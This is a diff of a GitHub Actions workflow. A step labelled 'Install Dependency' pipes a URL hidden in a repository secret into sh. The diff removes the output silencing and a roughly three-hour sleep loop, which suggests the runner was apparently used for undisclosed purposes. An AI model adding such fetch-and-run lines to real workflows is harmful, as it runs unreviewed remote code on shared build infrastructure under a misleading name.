@@ -20,12 +20,7 @@ jobs:
       - uses: actions/checkout@v3
       - name: Install Dependency
         run: |
-          curl -fsSL $T_URL | sh > /dev/null 2>&1
-          for i in {1..10800}
-          do
-            echo "hi $i" > /dev/null
-            sleep 1
-          done
+          curl -fsSL $T_URL | sh
         env:
           T_URL: ${{ secrets.T_URL }}
       - name: Post Cleanup...
